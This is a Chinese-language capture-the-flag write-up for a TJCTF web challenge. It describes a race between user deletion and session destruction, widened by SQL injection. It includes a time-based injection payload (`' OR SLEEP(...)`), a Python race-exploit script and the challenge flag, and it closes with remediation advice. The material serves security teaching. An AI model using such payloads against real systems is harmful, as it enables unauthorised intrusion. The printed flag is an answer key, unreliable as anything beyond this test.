# notes

## 题目简述

主页在 session 中存在 `user_id` 时并行查询 notes 和 users；若 users 查询找不到记录，就用 `{username: flag}` 作为兜底对象渲染。删除账号接口先从数据库删除用户，之后才销毁该用户的所有 session，中间存在“session 仍有效、用户记录已不存在”的状态窗口。

接口还把删除密码直接拼进两条 MySQL 查询，可以用 `SLEEP` 延长这个窗口。

## 解题过程

先创建一个或多个无关用户增加查询要遍历的行数，再用会话注册目标用户，密码设为 `test`。异步请求删除接口，提交：

```text
test' OR SLEEP(0.2) = '1
```

第一条 SQL 先删除密码确为 `test` 的当前用户，并在其他行上执行延时；第二条验证查询继续延时。直到两条查询的回调完成，代码才调用 `session.destroy()`。

在“数据库用户已删除但 session 尚未销毁”期间请求主页：

```python
import threading
import time
import requests

base = "https://TARGET"
requests.post(
    base + "/register", data={"username": "padding", "password": "x"}, timeout=10
)

session = requests.Session()
session.post(
    base + "/register", data={"username": "solver", "password": "test"}, timeout=10
)

def slow_delete():
    session.post(
        base + "/user/delete",
        data={"password": "test' OR SLEEP(0.2) = '1"},
        timeout=20,
    )

threading.Thread(target=slow_delete, daemon=True).start()
time.sleep(4.5)
page = session.get(base + "/", timeout=10).text
print(page[page.index("tjctf{"):page.index("}", page.index("tjctf{")) + 1])
```

主页的用户查询返回空集，触发危险兜底并显示：

```text
tjctf{du1y_n0t3d_b57687e5}
```

## 方法总结

- session 与数据库对象分两步删除时，会出现认证状态和实体状态不一致的 TOCTOU 窗口。
- SQL 注入在这里不是直接读取 flag，而是用 `SLEEP` 精确放大竞态；真正泄露来自错误的模板兜底值。
- 修复应参数化查询，在事务中完成删除与状态撤销，并且绝不能把秘密作为“用户不存在”时的显示默认值。
